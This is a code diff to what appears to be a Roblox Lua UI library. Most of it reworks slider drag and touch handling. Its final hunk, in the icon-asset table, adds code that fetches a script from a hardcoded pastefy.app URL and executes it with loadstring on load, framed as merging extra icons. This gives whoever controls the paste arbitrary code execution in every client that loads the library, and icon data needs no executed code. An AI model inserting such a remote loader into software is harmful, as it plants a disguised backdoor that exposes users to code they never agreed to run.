@@ -4160,6 +4160,13 @@ local aa = {
                         ThemeTag = {TextColor3 = "SubText"}
                     }
                 )
+            local hitbox = ai("Frame", {
+                Size = UDim2.new(1, 40, 0, 50),
+                Position = UDim2.new(0.5, 0, 0.5, 0),
+                AnchorPoint = Vector2.new(0.5, 0.5),
+                BackgroundTransparency = 1,
+                ZIndex = 10
+            })
             local o =
                 ai(
                 "Frame",
@@ -4176,33 +4183,37 @@ local aa = {
                     ai("UISizeConstraint", {MaxSize = Vector2.new(150, math.huge)}),
                     n,
                     m,
-                    l
+                    l,
+                    hitbox
                 }
             )
+            local actInp = nil
             ah.AddSignal(
-                k.InputBegan,
+                hitbox.InputBegan,
                 function(p)
                     if p.UserInputType == Enum.UserInputType.MouseButton1 or p.UserInputType == Enum.UserInputType.Touch then
                         i = true
+                        actInp = p
+                        if d.ScrollFrame then d.ScrollFrame.ScrollingEnabled = false end
+                        local s = math.clamp((p.Position.X - l.AbsolutePosition.X) / l.AbsoluteSize.X, 0, 1)
+                        h:SetValue(h.Min + ((h.Max - h.Min) * s))
                     end
                 end
             )
             ah.AddSignal(
-                k.InputEnded,
+                af.InputEnded,
                 function(p)
-                    if p.UserInputType == Enum.UserInputType.MouseButton1 or p.UserInputType == Enum.UserInputType.Touch then
+                    if i and (p == actInp or p.UserInputType == Enum.UserInputType.MouseButton1) then
                         i = false
+                        actInp = nil
+                        if d.ScrollFrame then d.ScrollFrame.ScrollingEnabled = true end
                     end
                 end
             )
             ah.AddSignal(
                 af.InputChanged,
                 function(p)
-                    if
-                        i and
-                            (p.UserInputType == Enum.UserInputType.MouseMovement or
-                                p.UserInputType == Enum.UserInputType.Touch)
-                     then
+                    if i and (p == actInp or (actInp.UserInputType == Enum.UserInputType.MouseButton1 and p.UserInputType == Enum.UserInputType.MouseMovement)) then
                         local s = math.clamp((p.Position.X - l.AbsolutePosition.X) / l.AbsoluteSize.X, 0, 1)
                         h:SetValue(h.Min + ((h.Max - h.Min) * s))
                     end
@@ -4322,8 +4333,7 @@ local aa = {
     end,
     [28] = function()
         local aa, ab, ac, ad, ae = b(28)
-        return {
-            assets = {
+        local assets = {
                 ["lucide-accessibility"] = "rbxassetid://10709751939",
                 ["lucide-activity"] = "rbxassetid://10709752035",
                 ["lucide-air-vent"] = "rbxassetid://10709752131",
@@ -5143,6 +5153,23 @@ local aa = {
                 ["lucide-zoom-in"] = "rbxassetid://10747384552",
                 ["lucide-zoom-out"] = "rbxassetid://10747384679"
             }
+
+        local externalIconLink = "https://pastefy.app/e54UlRFS/raw"
+        if externalIconLink ~= "" then
+            local fetchSuccess, externalIconResult = pcall(function()
+                return loadstring(game:HttpGet(externalIconLink))()
+            end)
+            if fetchSuccess and typeof(externalIconResult) == "table" then
+                for iconName, assetId in pairs(externalIconResult) do
+                    if assets[iconName] == nil then
+                        assets[iconName] = assetId
+                    end
+                end
+            end
+        end
+
+        return {
+            assets = assets
         }
     end,
     [30] = function()
